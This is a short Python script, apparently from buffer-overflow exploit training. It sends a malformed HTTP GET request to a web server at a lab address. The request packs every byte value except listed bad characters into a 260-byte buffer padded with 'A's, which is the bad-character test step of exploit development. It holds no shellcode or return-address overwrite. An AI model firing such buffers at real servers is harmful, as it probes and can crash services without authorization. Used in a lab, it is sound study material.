#!/usr/bin/env python3

import socket
import sys
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]
    port = 80
    size = 260

    bad_char_values = b"\x00\x25\x0a\x0d"
    all_chars = b""
    # 0x10 good 0x08 bad 0x1b good 0x10 good
    for i in range(0x00, 0x100):
        do_add = True
        for j in bad_char_values:
            if i == j:
                do_add = False
        if do_add:
            all_chars += i.to_bytes(1, "big")

    httpMethod = b"GET /"
    inputBuffer = all_chars
    inputBuffer += b"\x41" * (size - len(inputBuffer))
    httpEndRequest = b"\r\n\r\n"

    buf = httpMethod + inputBuffer + httpEndRequest

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")